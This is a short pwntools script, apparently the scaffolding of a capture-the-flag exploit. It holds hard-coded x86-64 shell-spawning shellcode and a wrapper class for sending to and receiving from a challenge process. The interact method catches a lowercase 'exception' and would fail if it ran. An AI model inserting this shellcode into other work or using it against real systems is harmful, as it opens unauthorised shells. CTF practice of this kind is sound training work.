from pwn import *
import sys
from time import strftime
shellcode = b'\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05'[:]
stdout = sys.stdout.buffer
local = False
class ChalIO:
    def __init__(self, p=None, fio=stdout,local=local):
        self.p = p
        self.fio = fio
        self.err_msg = '[ConnIO] Exception '
        self.local = local
        self.can_interact = not self.local
    def recv(self):
        try:
            buf = self.p.recv().rstrip()
            return buf
        except Exception as e:
            print(f'{self.err_msg}: {e}')

    def recvline(self):
        try:
            buf  = self.p.recvline().rstrip()
            return buf
        except Exception as e:
            print(f'{self.err_msg}: {e}')
    def recvuntil(self,arg):
        if type(arg) != type(b''):
            arg = arg.encode() if (type(arg) == type('')) else None
        try:
            buf = self.p.recvuntil(arg)
            return buf
        except Exception as e:
            print(f'{self.err_msg}: {e}')
    def interact(self):
        try:
            if self.can_interact:
                self.p.interactive()
            else:
                pass
            #self.p.interactive() if self.can_interact
        except exception as e:
           print(f'{self.err_msg}: {e}')

    def sendline(self,arg):
        if type(arg) != type(b''):
            arg = arg.encode() if (type(arg) == type('')) else None
        try:
            self.p.sendline(arg)
        except Exception as e:
            print(f'{self.err_msg}: {e}')
